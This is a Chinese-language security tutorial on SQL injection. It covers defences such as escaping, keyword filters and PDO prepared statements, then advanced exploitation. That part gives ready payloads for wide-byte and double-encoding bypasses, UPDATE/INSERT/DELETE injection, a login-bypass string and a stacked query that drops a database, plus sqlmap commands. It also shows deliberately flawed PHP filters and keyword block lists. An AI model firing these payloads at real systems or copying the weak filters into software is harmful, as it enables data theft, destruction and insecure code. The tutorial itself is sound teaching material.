---
title: "SQL 注入防御方案与利用进阶"
permalink: sql-injection-defense/
date: 2025-12-04 01:12:43
categories:
  - 网络安全
  - Web 安全
tags:
  - SQL注入
  - 安全开发
  - Web安全
img: /medias/featureimages/14.jpg
summary: "参数化查询、预编译、WAF 等防御方案，以及堆叠注入、宽字节注入等进阶利用场景。"
---

<!-- more -->

## 黑白名单
黑名单：记录谁 **就不允许**谁

白名单：记录谁 **就只允许**谁

## 具体方法
## 1 转义引号
如单引号闭合的注入，攻击者需要输入 **'**  ，开发者只需要把 ' 转义为 \' ，即可防御SQL注入漏洞

以PHP为例：mysqli_real_escape_string 函数

[https://www.php.net/manual/zh/mysqli.real-escape-string.php](https://www.php.net/manual/zh/mysqli.real-escape-string.php)

```php
$student_id = $_REQUEST['student_id'];

$student_id = mysqli_real_escape_string($conn, $student_id);

// 查询数据库
$sql = "SELECT name, score FROM students WHERE student_id = '$student_id' limit 0,1";
```

缺点：无法防御数字型 注入 （无闭合的注入）

⚠： 无闭合的注入，是不规范的写法，很难见到

## 2 检测参数是否为数字
以PHP为例：is_numeric 函数,，判断用户传入的参数是否是数字

```php
$student_id = $_REQUEST['student_id'];

if(!is_numeric($student_id))
{
  echo "<div style='text-align:center; margin-top:20px;'>";
  echo "<h2>查询失败</h2>";
  echo "<p>学号必须是数字。</p>";
  echo "</div>";
  exit;
}
// 查询数据库
$sql = "SELECT name, score FROM students WHERE student_id = $student_id limit 0,1";
```

## 3 检测并替换敏感字符
 以PHP为例：str_replace 字符串替换函数

```plain
把 order 替换为 f@ck
把 information_schema 替换为 f@ck
```

```php
$student_id = $_REQUEST['student_id'];

$student_id = str_replace("order", "f@ck", $student_id);
$student_id = str_replace("by", "f@ck", $student_id);
$student_id = str_replace("information_schema", "f@ck", $student_id);
$student_id = str_replace(")", "f@ck", $student_id);
$student_id = str_replace("union", "f@ck", $student_id);

// 查询数据库
$sql = "SELECT name, score FROM students WHERE student_id = '$student_id' limit 0,1";
```

⚠️：不能替换为空，即删除字符串，如下代码为**错误示例**

```php
$student_id = $_REQUEST['student_id'];

$student_id = str_replace("order", "", $student_id);
$student_id = str_replace("by", "", $student_id);
$student_id = str_replace("information_schema", "", $student_id);
$student_id = str_replace(")", "", $student_id);
$student_id = str_replace("union", "", $student_id);

// 查询数据库
$sql = "SELECT name, score FROM students WHERE student_id = '$student_id' limit 0,1";
```

```php
如果输入 order by 会被删掉，攻击者可以采用双写绕过
如输入 ororderder bbyy，这时 order by 会被删掉，剩下的字符会组成新的 order by 形成攻击
```

## 4 检测并拦截敏感字符（类似于WAF）
以PHP为例：strstr 检测一个字符串是否出现在了另一个字符串中

以下代码作用：

```php
把 student_id 出现了 order, 就直接拦截
```

```php
$student_id = $_REQUEST['student_id'];

if(strstr($student_id, "order")){
  echo "已被拦截，请不要尝试注入";
  echo "你的ip地址是：" . $_SERVER['REMOTE_ADDR'];
  exit;
}

// 查询数据库
$sql = "SELECT name, score FROM students WHERE student_id = '$student_id' limit 0,1";
```

```php
更好的语法：正则匹配 preg_match
```

```php
$student_id = $_REQUEST['student_id'];

// 拦截常见的注入关键词
$patterns = array("/order/", "/by/","/information_schema/","/)/","/union/","/limit/","/select/");
foreach($patterns as $pattern){
  if(preg_match($pattern, $student_id)){
    echo "已被拦截，请不要尝试注入";
    echo "你的ip地址是：" . $_SERVER['REMOTE_ADDR'];
    exit;
  }
}

// 查询数据库
$sql = "SELECT name, score FROM students WHERE student_id = '$student_id' limit 0,1";
```

## 5 SQL 语句预处理
**SQL 语句预处理**（也称为参数化查询）是一种安全执行 SQL 操作的技术，它通过将 SQL 语句的**结构**与**数据**分离，从根本上防止 SQL 注入攻击

### 以PHP为例： PDO
PDO步骤：

```php
编写SQL语句，SQL语句中不存在变量，而是占位符
预处理SQL语句
绑定参数
执行查询
```

为什么PDO能防御SQL注入漏洞？

因为用户从前端传入的参数，没有拼接到SQL语句中

```php
$student_id = $_REQUEST['student_id'];

// 查询数据库
// $sql = "SELECT name, score FROM students WHERE student_id = '$student_id' limit 0,1";
$sql = "SELECT name, score FROM students WHERE student_id = :student_id limit 0,1";
$stmt = $conn->prepare($sql);
$stmt->bindParam(':student_id', $student_id);
$stmt->execute();
$result = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

网站使用了PDO SQL预处理，一定能够防御SQL注入吗？

```plain
不一定 ， 只有正确的使用PDO（SQL语句中是占位符+参数绑定）才能防御SQL注入

有些开发者，会用错PDO (没有进行占位符+参数绑定)，虽然SQL语句进行了预处理，
但是依然会导致SQL注入
```

如下代码，是错误示例，虽然使用的预处理，但是依然把用户从前端传入的参数直接拼接到了SQL语句中，存在SQL注入

```php
$student_id = $_REQUEST['student_id'];

// 查询数据库
//$sql = "SELECT name, score FROM students WHERE student_id = '$student_id' limit 0,1";
$sql = "SELECT name, score FROM students WHERE student_id = '$student_id' limit 0,1";
$stmt = $conn->prepare($sql);
$stmt->execute();
$result = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

## SQL 注入利用-特殊注入类型
## 1 宽字节注入
宽字节注入是一种特殊的SQL注入攻击技术，主要针对使用多字节字符编码（如GBK、BIG5等）的数据库系统。它利用应用程序与数据库之间字符编码不一致或转义机制缺陷，使攻击者能够绕过常规的SQL注入防护措施。

宽字节注入的核心在于：**多字节字符编码中，某些字符组合会被解释为一个完整字符**，从而"吞噬"转义字符，使危险字符逃脱限制

### 利用前提
+ 防御了SQL注入，转义了单引号
+ 设置了数据库客户端的字符集编码为 gbk

```sql
$student_id = $_REQUEST["student_id"];
// 转义特殊字符，防止注入
$student_id = mysqli_real_escape_string($conn, $student_id);
// 设置字符集为gbk
$set = "set character_set_client=gbk";
$conn->query($set);

// 查询数据库
$sql = "SELECT name, score FROM students WHERE student_id = '$student_id' limit 0,1"
```

### 利用方式
单引号的URL编码是 %27 ， 只需要在 %27 前加 %df ，**形成 %df%27**即可绕过防御

### SQLMAP
sqlmap 默认无法测出宽字节注入，需要手动加上 %df%27

### 原理
```php
%df 和 \ 组成了一个繁体字符
 %cd 、%af 等都行
```

## 2 二次编码注入
**二次编码注入**是一种SQL注入攻击的高级技巧，攻击者通过**双重编码**恶意载荷来绕过Web应用的安全过滤机制。这种攻击利用了应用程序在处理用户输入时可能进行**多次解码**的特性。

**二次编码注入**: 关注**同一请求**中多次解码导致的绕过

### 利用前提
```php
防御了SQL注入，转义了单引号
代码里又进行了 URL 解码
```

```php
$student_id = urldecode(mysqli_real_escape_string($conn, $_REQUEST["student_id"]));

// 查询数据库
$sql = "SELECT name, score FROM students WHERE student_id = '$student_id' limit 0,1";
```

### 利用方式
单引号的URL编码是 %27 ， 只需要在 %27 前加 %25 ，并删除 % ，**形成 %2527** 即可绕过防御

### SQLMAP
```php
python sqlmap.py -u "http://192.168.79.120/double_urlencode_sqli.php?student_id=20210101%2527"
```

#### 原理
`%23 解码 是 #`

## 3 二次注入
什么 是 二 次 注 入 ？：多个页面共同产生的SQL注入漏洞

**二次注入**: 恶意数据**先存储**在数据库，**后使用**时才触发攻击

在二次注入的情况下，攻击者提供的恶意数据首先被存储到数据库中，然后在后续的操作或查询中被使用时才触发攻击。

### 二次注入的工作原理
1. **初始输入阶段**：攻击者向应用程序提供看似无害的数据，比如用户名、电子邮件地址等，这些数据实际上包含了恶意的SQL代码。
2. **数据存储阶段**：应用程序将这些数据存储在数据库中，但此时并没有执行任何有害操作，因为数据只是被保存而没有立即用于查询。
3. **后续使用阶段**：当应用程序稍后使用之前存储的数据进行查询或其他操作时，如果没有对这些数据进行适当的验证和清理，那么包含的恶意SQL代码就会被执行，导致攻击发生。

```lua
解释
注册一个名为 1' order by 9# 的用户
登录该用户
登录成功后，服务器会话中 会存储 登录信息，即用户名 1' order by 9#
首页从服务器会话中读取用户名并拼接到sql语句中，触发sql注入漏洞
```

## 4 update注入
### 测试闭合
#### 引号测试
双引号有 语法错误，单引号没有语法错误，闭合可能是 双引号

#### and 1=1 测闭合
❌  慎用

```lua
8" and 1=1# 测试后，所有的行数据都会被改为 1
```

原理：

```sql
原本的SQL语句
UPDATE students SET score = "$score" WHERE id = "$id"
输入score 为 8" and 1=1#
UPDATE students SET score = "8" and 1=1 #" WHERE id = "$id"
```

WHERE id = 4  被注释了，所以mysql不知道更新谁，就会更新所有的行数据

✔ 正确的用法：

```sql
6" and 1="1
这时只会改一行数据
```

原理：

```sql
原本的SQL语句
UPDATE students SET score = "$score" WHERE id = "$id"
输入score 为 6" and 1="1
UPDATE students SET score = "6" and 1="1" WHERE id = "3"
```

#### sleep 测闭合
✔ 正确的测试方法

```sql
9" and sleep(5) and "
```

❌  错误的测试方法：会把所有行都变成 0 ⚠️

```sql
9" and sleep(5) #
```

#### order by 测闭合
order by 用在 update 注入中，不会触发 update 更新操作

```sql
9" order by 999#
```

### 获取数据
#### 报错注入
✔ 报错注入最安全，update 不会触发

```sql
9" and updatexml(1,concat(0x7e, (select database()),0x7e) ,1) #
```

#### 布尔盲注
⚠️ ：update 注入如果想使用 or 或 and 测试，**就不要加 #**

```sql
0" or left(version(),1) ='8' or "
```

```sql
0" or left(version(),1) ='5' or "
前端发现为 1，说明 当前数据库的版本等于 5
```

#### 时间盲注
```sql
8" and if((left(version(),1) ='5'), sleep(5), null) and "
sleep 5 触发了，说明数据库的版本是 5
```

```sql
8" and if((left(version(),1) ='8'), sleep(5), null) and "
sleep 5 没有触发，说明数据库的版本不是 8
```

## 5 insert 注入
### 测试闭合
可能会新增很多脏数据

insert 型注入不会用到注释，原因如下

```sql
原本的sql语句
INSERT INTO students (name, subject, score) VALUES ("$name", "$subject","$score")
攻击者输入name为han" and 1=1# ，sql语句就会变成
INSERT INTO students (name, subject, score) VALUES ("han" and 1=1#
会发现多出一个 ( ，导致SQL语法错误，无法实现注入
```

✔ 正确的测试闭合方法如下

```sql
han" and 1="1
han" and 1=1 and "
```

### 利用方法
#### 报错注入
```sql
han" and updatexml(1,concat(0x7e, (select version()),0x7e) ,1) and "
```

#### 时间盲注
```sql
96" and if((left(version(),1)= '5'),sleep(5),null) and "1
```

```sql
参数是数字型才能使用时间盲注，如果是非数字型使用时间盲注，就会报错
```

原因：时间盲注使用的sleep 函数的值永远是0, 0是数字 (int) , insert into 到一个字符串 (varchar)的字段时，就会报错

#### 布尔盲注
```sql
参数是数字型才能使用布尔盲注，如果是非数字型使用布尔盲注，就会报错
" and left(version(),1)='8' and "1
```

```sql
96" and left(version(),1)='5' and "1
```

#### SQLMAP
⚠️ 实际工作中，千万不要用 sqlmap 测insert 注入，sqlmap会插入大量的脏数据

## 6 delete 注入
⚠️ 实际工作中，千万不要测删除功能可能出现的漏洞

### ✔ 安全的测试闭合
```sql
999" order by 99#
```

### ❌  危险的测试闭合 (会把数据清空)
```sql
999" or 1=1#
```

### ✔ 安全的报错注入
```sql
999" and updatexml(1,concat(0x7e,version(),0x7e),1)#
```

### ❌ 危险的时间盲注
虽然不会删数据，但是可能会sleep 太长时间，破坏服务器）

```sql
999" or if((left(version(),1) = '5'), sleep(5), 1)#
```

##   7 header 头注入
header 一般都是 insert 行注入

### 1 UA 注入

SQLmap 测试 （level 3）

```plain
python sqlmap.py -u "http://192.168.2.50/login.php" --data="username=xiaohe&password=1" --level 3
```

### 2 Referer 注入

SQLmap 测试 （level 3）

### 3 Cookie 注入

SQLmap 测试（level 2）

```xml
python sqlmap.py -u "http://192.168.2.50/login.php" --data="username=xiaohe&password=1" --level 2
```

## 8 万能密码
```xml
用户名: 1' or 1=1#  用户名为真
密码: 随意 被注释掉了
```

原理

SQL 语句：输入正确的用户名和密码 就能登录成功

```toml
SELECT username,password FROM users WHERE username = '$username' and
password = '".hash('sha256', $password)."'"
```

攻击者输入：

```toml
username=1' or 1=1#
psssword=123
```

下面这条 SQL 语句永真

```toml
SELECT username,password FROM users WHERE username = '1' or 1=1#
```

## 9 堆叠注入
在一次注入中，使用分号分隔，能执行多条任意sql语句（增、删、改、查），危害大

```toml
http://192.168.2.50/?id=1%27;
show%20databases;select%20version();drop%20database%20test;
```

上述攻击，一次执行了

```toml
show databases;
select version();
drop database test;
```



⚠️：mysql 一般是不支持堆叠注入的，除非使用 mysqli_multi_query 函数，如下所示

```toml
$id = $_GET['id'];
$sql = "select * from users where id='$id' limit 0,1";
$res = mysqli_multi_query($coon, $sql);
```
